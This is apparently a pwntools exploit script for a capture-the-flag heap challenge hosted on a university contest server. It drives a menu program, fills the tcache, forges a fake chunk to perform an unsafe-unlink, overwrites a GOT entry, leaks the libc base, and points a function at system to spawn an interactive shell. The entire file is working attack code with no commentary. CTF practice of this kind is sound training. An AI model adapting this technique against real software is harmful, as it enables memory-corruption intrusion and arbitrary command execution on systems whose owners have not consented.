from pwn import *

def add_(index,size):
	r.recvuntil(b"please input your choice:")
	r.sendline(b"1")
	r.recvuntil(b"please input the idx")
	r.sendline(str(index))
	r.recvuntil(b"please input the size")
	r.sendline(str(size))
	return
def del_(index):
	r.recvuntil(b"please input your choice:")
	r.sendline(b"2")
	r.recvuntil(b"please input the idx")
	r.sendline(str(index))
	return
def show_(index):
	r.recvuntil(b"please input your choice:")
	r.sendline(b"3")
	r.recvuntil(b"please input the idx")
	r.sendline(str(index))
	return
def edit_(index,pay):
	r.recvuntil(b"please input your choice:")
	r.sendline(b"4")
	r.recvuntil(b"please input the idx")
	r.sendline(str(index))
	r.recvuntil(b"please input the content")
	r.send(pay)
	return


#r=process("./pwn")
r=remote("contest.ctf.nefu.edu.cn",33050)
pause()

add_(3,0x80)
add_(4,0x80)
add_(5,0x80)
add_(6,0x80)
add_(7,0x80)
add_(8,0x80)
add_(9,0x80)
add_(10,0x80)
add_(11,0x80)

add_(0,0x48)
add_(1,0x80)
add_(2,0x80)
heap_add=0x6020E0
pay1=p64(0)+p64(0x41)+p64(heap_add-0x18)+p64(heap_add-0x10)+b'a'*0x20+p64(0x40)+b"\x90"
edit_(0,pay1)


del_(3)
del_(4)
del_(5)
del_(6)
del_(7)
del_(8)
del_(9)
del_(10)

del_(1)
pay=p64(0)*3+p64(0x602058)
edit_(0,pay)
show_(0)
libc_base=u64(r.recvuntil(b"\x7f")[1:].ljust(8,b"\x00"))-0x40670
print(hex(libc_base))
libc=ELF("./libc-2.27.so")
sys_add=libc.sym[b"system"]+libc_base
edit_(0,p64(sys_add))
r.sendline("/bin/sh\x00")
r.interactive()
